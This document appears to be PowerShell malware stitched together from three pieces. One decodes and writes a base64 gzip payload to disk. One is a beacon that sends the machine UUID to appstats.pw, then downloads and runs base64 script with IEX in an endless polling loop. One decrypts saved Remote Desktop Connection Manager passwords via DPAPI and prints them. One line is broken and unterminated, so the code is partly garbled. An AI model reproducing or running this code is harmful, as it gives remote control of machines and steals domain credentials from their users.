[CmdletBinding()] 

Param ([Parameter(Mandatory)] [string[]] $memstream = $(Throw("-memstream is required")),
 [Parameter(Mandatory)] [string[]] $outputloc = $(Throw("-outputloc is required"))
)

function Get-DecompressedByteArray {

 [CmdletBinding()] Param ([Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
 [byte[]] $byteArray)

 Process {
 Write-Verbose "Get-DecompressedByteArray"
 $input = New-Object System.IO.MemoryStream( , $byteArray )
 $output = New-Object System.IO.MemoryStream
 $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
 $gzipStream.CopyTo( $output )
 $gzipStream.Close()
 $input.Close()
 [byte[]] $byteOutArray = $output.ToArray()
 Write-Output $byteOutArray
 }
}

function Write-StreamToDisk {

 [io.file]::WriteAllBytes("$outputloc",$(Get-DecompressedByteArray -byteArray $([System.Convert]::FromBase64String($memstream))))

}

Write-StreamToDisk -memstream $memstream -outputloc $outputloc

$uuid=(get-wmiobject win32_computersystemproduct).UUID;$wc=New-Object System.Net.WebClient;
$u='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.363 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.363';
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "u=$uuid; c=x3c93dlfcu53");
$wc.Headers.Add('user-agent',$u);$reg=$wc.downloadstring("https://www.appstats.pw/index.php");
$wc.Headers.Remove([System.Net.HttpRequestHeader]::Cookie);
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "u=$uuid");
$wc.headers.add('user-agent',$u);IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring("https://www.appstats.pw/3del.php"))));
while($true){
 try{
 $wc.headers.add('user-agent',$u);
 IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring("https://www.appstats.pw/index.php"))));
 }
 catch{
 sleep 180;
 }
}

﻿function Decrypt-RDCMan ($FilePath) {

 if (!$FilePath) {
 [xml]$config = Get-Content "$env:LOCALAPPDATA\microsoft\remote desktop connection manager\rdcman.settings"
 $Xml = Select-Xml -Xml $config -XPath "//FilesToOpen/*"
 $Xml | select-object -ExpandProperty "Node"| % {Write-Output "Decrypting file: " $_.InnerText; Decrypt-RDCMan $_.InnerText}
 } else {
 [xml]$Types = Get-Content $FilePath

 $Xml = Select-Xml -Xml $Types -XPath "//logonCredentials"


 $Xml | select-object -ExpandProperty "Node" | % { $pass = Decrypt-DPAPI $_.Password; $_.Domain + "\" + $_.Username + " - " + $Pass + " - " + "Hash:" + $_.Password + "`n" } 


 $Xml | select-object -ExpandProperty "Node" | % { $pass = Decrypt-DPAPI $_.Password."
 }
}

function Decrypt-DPAPI ($EncryptedString) {

 Add-Type -assembly System.Security
 $encoding= [System.Text.Encoding]::ASCII
 $uencoding = [System.Text.Encoding]::UNICODE


 try {
 $encryptedBytes = [System.Convert]::FromBase64String($encryptedstring)
 $bytes1 = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 [System.Text.Encoding]::Convert([System.Text.Encoding]::UNICODE, $encoding, $bytes1) | % { $myStr1 += [char]$_}
 echo $myStr1
 } 
 catch {

 try {
 $encryptedBytes = [System.Convert]::FromBase64String($encryptedstring)
 $bytes1 = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
 [System.Text.Encoding]::Convert([System.Text.Encoding]::UNICODE, $encoding, $bytes1) | % { $myStr1 += [char]$_}
 echo $myStr1
 }
 catch {
 echo "Could not decrypt password"
 }
 }
}

